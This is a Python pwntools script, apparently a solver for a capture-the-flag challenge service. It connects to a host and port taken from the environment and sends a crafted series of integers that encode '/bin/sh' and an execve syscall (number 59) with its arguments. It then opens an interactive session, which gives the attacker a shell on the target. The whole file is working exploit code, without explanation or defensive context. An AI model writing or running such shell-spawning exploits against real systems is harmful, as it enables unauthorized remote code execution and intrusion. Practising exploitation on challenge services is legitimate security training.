import os

from pwn import context, remote


def build_inputs() -> list[int]:
    values: list[int] = []

    for char in "/bin/sh"[::-1]:
        values.append(ord(char) * 2**32 + 1)
        values.append(2)
        values.append(2)

    args = [59, 4294967295, 0, 0]
    for arg in args[::-1]:
        values.append(arg)
        values.append(0)
        values.append(2)

    for char in "/."[::-1]:
        values.append(ord(char))

    values.append(12)
    return values


def main() -> int:
    context.log_level = "error"

    host = os.environ.get("HOST", "127.0.0.1")
    port = int(os.environ.get("PORT", "1337"))

    io = remote(host, port)
    for value in build_inputs():
        io.sendline(str(value).encode("ascii"))

    io.interactive()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())